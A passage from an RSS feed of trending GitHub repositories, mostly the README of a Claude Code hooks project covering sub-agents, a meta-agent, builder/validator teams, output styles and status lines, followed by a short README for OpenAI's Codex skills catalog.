‚îú‚îÄ‚îÄ meta-agent.md              # Agent that creates agents
‚îî‚îÄ‚îÄ work-completion-summary.md # Audio summary generator
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Storage Hierarchy&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Project agents&lt;/strong&gt;: &lt;code&gt;.claude/agents/&lt;/code&gt; (higher priority, project-specific)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;User agents&lt;/strong&gt;: &lt;code&gt;~/.claude/agents/&lt;/code&gt; (lower priority, available across all projects)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Format&lt;/strong&gt;: Markdown files with YAML frontmatter&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Agent File Structure:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Sub-agents enable:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Task specialization&lt;/strong&gt; - Code reviewers, debuggers, test runners&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Context preservation&lt;/strong&gt; - Each agent operates independently&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Tool restrictions&lt;/strong&gt; - Grant only necessary permissions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic delegation&lt;/strong&gt; - Claude proactively uses the right agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Key Engineering Insights&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Two Critical Mistakes to Avoid:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Misunderstanding the System Prompt&lt;/strong&gt; - What you write in agent files is the &lt;em&gt;system prompt&lt;/em&gt;, not a user prompt. This changes how you structure instructions and what information is available to the agent.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Ignoring Information Flow&lt;/strong&gt; - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Best Practices:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use the &lt;code&gt;description&lt;/code&gt; field to tell your primary agent &lt;em&gt;when&lt;/em&gt; and &lt;em&gt;how&lt;/em&gt; to prompt sub-agents&lt;/li&gt; 
 &lt;li&gt;Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions&lt;/li&gt; 
 &lt;li&gt;Remember sub-agents start fresh with no context - be explicit about what they need to know&lt;/li&gt; 
 &lt;li&gt;Follow Problem ‚Üí Solution ‚Üí Technology approach when building agents&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Complex Workflows &amp;amp; Agent Chaining&lt;/h3&gt; 
&lt;p&gt;Claude Code can intelligently chain multiple sub-agents together for complex tasks:&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;"First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"&lt;/li&gt; 
 &lt;li&gt;"Use the debugger agent to fix errors, then have the code-reviewer check the changes"&lt;/li&gt; 
 &lt;li&gt;"Generate a new agent with meta-agent, then test it on a specific task"&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.&lt;/p&gt; 
&lt;h3&gt;The Meta-Agent&lt;/h3&gt; 
&lt;p&gt;The meta-agent (&lt;code&gt;.claude/agents/meta-agent.md&lt;/code&gt;) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Why Meta-Agent Matters:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Rapid Agent Creation&lt;/strong&gt; - Build dozens of specialized agents in minutes instead of hours&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Consistent Structure&lt;/strong&gt; - Ensures all agents follow best practices and proper formatting&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Live Documentation&lt;/strong&gt; - Pulls latest Claude Code docs to stay current with features&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent Tool Selection&lt;/strong&gt; - Automatically determines minimal tool requirements&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Using the Meta-Agent:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.&lt;/p&gt; 
&lt;h2&gt;Team-Based Validation System&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See agent teams and the &lt;code&gt;/plan_w_team&lt;/code&gt; workflow in action at &lt;a href="https://youtu.be/4_2j5wgt_ds"&gt;https://youtu.be/4_2j5wgt_ds&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/cctask.png" alt="Claude Code Task System" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This repository includes a powerful build/validate workflow pattern using the Claude Code task system to orchestrate specialized agent teams.&lt;/p&gt; 
&lt;h3&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; Meta Prompt&lt;/h3&gt; 
&lt;p&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; command (&lt;code&gt;.claude/commands/plan_w_team.md&lt;/code&gt;) is not an ordinary prompt‚Äîit has three powerful components:&lt;/p&gt; 
&lt;h4&gt;1. Self-Validating&lt;/h4&gt; 
&lt;p&gt;The prompt includes embedded hooks in its front matter that validate its own output:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;hooks:
  stop:
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_new_file.py specs/*.md"
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_file_contains.py"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After the planning agent finishes, these validators ensure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;A spec file was created in the correct directory&lt;/li&gt; 
 &lt;li&gt;The file contains required sections (team orchestration, step-by-step tasks, etc.)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If validation fails, the agent receives feedback and continues working until the output meets criteria.&lt;/p&gt; 
&lt;h4&gt;2. Agent Orchestration&lt;/h4&gt; 
&lt;p&gt;The prompt leverages Claude Code's task system to build and coordinate agent teams:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Task Tool&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskCreate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Create new tasks with owners, descriptions, dependencies&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskUpdate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Update status, add blockers, communicate completion&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskList&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;View all tasks and their current state&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskGet&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Retrieve full task details&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;How it works:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Primary agent creates a task list with specific owners (builder/validator)&lt;/li&gt; 
 &lt;li&gt;Tasks can run in parallel or have dependency blockers&lt;/li&gt; 
 &lt;li&gt;Subagents complete work and ping back to the primary agent&lt;/li&gt; 
 &lt;li&gt;Primary agent reacts in real-time as work completes&lt;/li&gt; 
 &lt;li&gt;Blocked tasks automatically unblock when dependencies finish&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;This enables longer-running threads of work because the task system handles coordination‚Äîno bash sleep loops needed.&lt;/p&gt; 
&lt;h4&gt;3. Templating&lt;/h4&gt; 
&lt;p&gt;&lt;code&gt;/plan_w_team&lt;/code&gt; is a &lt;strong&gt;template meta prompt&lt;/strong&gt;‚Äîa prompt that generates prompts in a specific, vetted format:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-markdown"&gt;## Plan Format (embedded in the meta prompt)

### {{PLAN_NAME}}
**Task:** {{TASK_DESCRIPTION}}
**Objective:** {{OBJECTIVE}}

### Team Orchestration
{{TEAM_MEMBERS}}

### Step-by-Step Tasks
{{TASKS}}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The generated plan follows your engineering patterns exactly. This is the difference between agentic engineering and "vibe coding"‚Äîyou know the outcome your agent will generate because you've templated the format.&lt;/p&gt; 
&lt;h3&gt;Team Agents&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Agent&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Tools&lt;/th&gt; 
   &lt;th&gt;Self-Validation&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Builder&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/builder.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;All tools&lt;/td&gt; 
   &lt;td&gt;Ruff + Ty on .py files&lt;/td&gt; 
   &lt;td&gt;Execute implementation tasks, build the thing&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Validator&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/validator.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Read-only (no Write/Edit)&lt;/td&gt; 
   &lt;td&gt;None&lt;/td&gt; 
   &lt;td&gt;Verify builder's work meets acceptance criteria&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;This two-agent pairing increases compute to increase trust that work was delivered correctly.&lt;/p&gt; 
&lt;h3&gt;Code Quality Validators&lt;/h3&gt; 
&lt;p&gt;PostToolUse validators automatically enforce code quality:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Validator&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Trigger&lt;/th&gt; 
   &lt;th&gt;Action&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ruff&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on lint errors&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ty&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ty_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on type errors&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Workflow Example&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# 1. Create a plan with team orchestration
/plan_w_team

# User prompt: "Update the hooks documentation and add missing status lines"
# Orchestration prompt: "Create groups of agents for each hook, one builder and one validator"

# 2. Plan is generated with:
#    - Team members (session_end_builder, session_end_validator, etc.)
#    - Step-by-step tasks with dependencies
#    - Validation commands

# 3. Execute the plan
/build

# 4. Watch agents work in parallel:
#    - Builders implement features
#    - Validators verify completion
#    - Task system coordinates everything
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter rules&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker settings&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/team/&lt;/code&gt; - Team agent definitions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Output Styles Collection&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/genui.png" alt="GenUI Output Style" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This project includes a comprehensive collection of custom output styles (&lt;code&gt;.claude/output-styles/&lt;/code&gt;) that transform how Claude Code communicates responses. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/output-styles"&gt;official documentation&lt;/a&gt; for complete details on how output styles work.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Style&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Best For&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;genui&lt;/strong&gt; ‚≠ê&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Generates beautiful HTML with embedded styling&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Interactive visual outputs, instant browser preview&lt;/strong&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;table-based&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Organizes all information in markdown tables&lt;/td&gt; 
   &lt;td&gt;Comparisons, structured data, status reports&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;yaml-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Formats responses as YAML configuration&lt;/td&gt; 
   &lt;td&gt;Settings, hierarchical data, API responses&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;bullet-points&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Clean nested lists with dashes and numbers&lt;/td&gt; 
   &lt;td&gt;Action items, documentation, task tracking&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;ultra-concise&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Minimal words, maximum speed&lt;/td&gt; 
   &lt;td&gt;Experienced devs, rapid prototyping&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;html-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Semantic HTML5 with data attributes&lt;/td&gt; 
   &lt;td&gt;Web documentation, rich formatting&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;markdown-focused&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Leverages all markdown features optimally&lt;/td&gt; 
   &lt;td&gt;Complex documentation, mixed content&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;tts-summary&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Announces task completion via ElevenLabs TTS&lt;/td&gt; 
   &lt;td&gt;Audio feedback, accessibility&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; Run &lt;code&gt;/output-style [name]&lt;/code&gt; to activate any style (e.g., &lt;code&gt;/output-style table-based&lt;/code&gt;)&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Project styles: &lt;code&gt;.claude/output-styles/*.md&lt;/code&gt; (this repo)&lt;/li&gt; 
 &lt;li&gt;User styles: &lt;code&gt;~/.claude/output-styles/*.md&lt;/code&gt; (global)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.&lt;/p&gt; 
&lt;h2&gt;Custom Status Lines&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/statusline"&gt;official documentation&lt;/a&gt; for complete details.&lt;/p&gt; 
&lt;h3&gt;Available Status Lines&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt; &lt;code&gt;.claude/status_lines/&lt;/code&gt;&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Version&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Features&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v1&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Basic MVP&lt;/td&gt; 
   &lt;td&gt;Git branch, directory, model info&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Smart prompts&lt;/td&gt; 
   &lt;td&gt;Latest prompt (250 chars), color-coded by task type&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v3&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Agent sessions&lt;/td&gt; 
   &lt;td&gt;Agent name, model, last 3 prompts&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v4&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Extended metadata&lt;/td&gt; 
   &lt;td&gt;Agent name, model, latest prompt, custom key-value pairs&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v5&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Cost tracking&lt;/td&gt; 
   &lt;td&gt;Model, cost ($), line changes (+/-), session duration&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v6&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Context window&lt;/td&gt; 
   &lt;td&gt;Visual usage bar, percentage, tokens remaining&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v7&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Duration timer&lt;/td&gt; 
   &lt;td&gt;Session time, start time, optional end time&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Token/cache stats&lt;/td&gt; 
   &lt;td&gt;Input/output tokens, cache creation/read stats&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v9&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Powerline minimal&lt;/td&gt; 
   &lt;td&gt;Stylized segments with powerline separators, git branch, % used&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Session Management&lt;/h3&gt; 
&lt;p&gt;Status lines leverage session data stored in &lt;code&gt;.claude/data/sessions/&amp;lt;session_id&amp;gt;.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "session_id": "unique-session-id",
  "prompts": ["first prompt", "second prompt", ...],
  "agent_name": "Phoenix",  // Auto-generated unique name
  "extras": {              // v4: Custom metadata (optional)
    "project": "myapp",
    "status": "debugging",
    "environment": "prod"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Agent Naming:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Automatically generates unique agent names using LLM services&lt;/li&gt; 
 &lt;li&gt;Priority: Ollama (local) ‚Üí Anthropic ‚Üí OpenAI ‚Üí Fallback names&lt;/li&gt; 
 &lt;li&gt;Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)&lt;/li&gt; 
 &lt;li&gt;Enabled via &lt;code&gt;--name-agent&lt;/code&gt; flag in &lt;code&gt;user_prompt_submit.py&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Custom Metadata (v4):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use &lt;code&gt;/update_status_line&lt;/code&gt; command to add custom key-value pairs&lt;/li&gt; 
 &lt;li&gt;Displayed at the end of the status line in cyan brackets&lt;/li&gt; 
 &lt;li&gt;Persists across Claude Code interactions&lt;/li&gt; 
 &lt;li&gt;Example: &lt;code&gt;/update_status_line &amp;lt;session_id&amp;gt; project myapp&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;Set your preferred status line in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "statusLine": {
    "type": "command",
    "command": "uv run $CLAUDE_PROJECT_DIR/.claude/status_lines/status_line_v3.py"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Status Line Features:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Real-time updates&lt;/strong&gt; - Refreshes on message changes (300ms throttle)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Color coding&lt;/strong&gt; - Visual indicators for different task types&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Smart truncation&lt;/strong&gt; - Manages long prompts elegantly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Session persistence&lt;/strong&gt; - Maintains context across interactions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Task Type Indicators (v2/v3):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üîç Purple - Analysis/search tasks&lt;/li&gt; 
 &lt;li&gt;üí° Green - Creation/implementation tasks&lt;/li&gt; 
 &lt;li&gt;üîß Yellow - Fix/debug tasks&lt;/li&gt; 
 &lt;li&gt;üóëÔ∏è Red - Deletion tasks&lt;/li&gt; 
 &lt;li&gt;‚ùì Blue - Questions&lt;/li&gt; 
 &lt;li&gt;üí¨ Default - General conversation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Master Agentic Coding&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Prepare for the future of software engineering&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Learn tactical agentic coding patterns with &lt;a href="https://agenticengineer.com/tactical-agentic-coding?y=ssvhooks"&gt;Tactical Agentic Coding&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Follow the &lt;a href="https://www.youtube.com/@indydevdan"&gt;IndyDevDan YouTube channel&lt;/a&gt; to improve your agentic coding advantage.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>openai/skills</title>
      <link>https://github.com/openai/skills</link>
      <description>&lt;p&gt;Skills Catalog for Codex&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Agent Skills&lt;/h1&gt; 
&lt;p&gt;Agent Skills are folders of instructions, scripts, and resources that AI agents can discover and use to perform at specific tasks. Write once, use everywhere.&lt;/p&gt; 
&lt;p&gt;Codex uses skills to help package capabilities that teams and individuals can use to complete specific tasks in a repeatable way. This repository catalogs skills for use and distribution with Codex.&lt;/p&gt; 
&lt;p&gt;Learn more:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills"&gt;Using skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills/create-skill"&gt;Create custom skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentskills.io"&gt;Agent Skills open standard&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installing a skill&lt;/h2&gt; 
&lt;p&gt;Skills in &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.system/"&gt;&lt;code&gt;.system&lt;/code&gt;&lt;/a&gt; are automatically installed in the latest version of Codex.&lt;/p&gt; 
&lt;p&gt;To install &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.curated/"&gt;curated&lt;/a&gt; or &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.experimental/"&gt;experimental&lt;/a&gt; skills, you can use the &lt;code&gt;$skill-installer&lt;/code&gt; inside Codex.&lt;/p&gt; 
&lt;p&gt;Curated skills can be installed by name (defaults to &lt;code&gt;skills/.curated&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer gh-address-comments
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For experimental skills, specify the skill folder. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install the create-plan skill from the .experimental folder
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Or provide the GitHub directory URL:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install https://github.com/openai/skills/tree/main/skills/.experimental/create-plan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After installing a skill, restart Codex to pick up new skills.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The license of an individual skill can be found directly inside the skill's directory inside the &lt;code&gt;LICENSE.txt&lt;/code&gt; file.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/qlib</title>
      <link>https://github.com/microsoft/qlib</link>
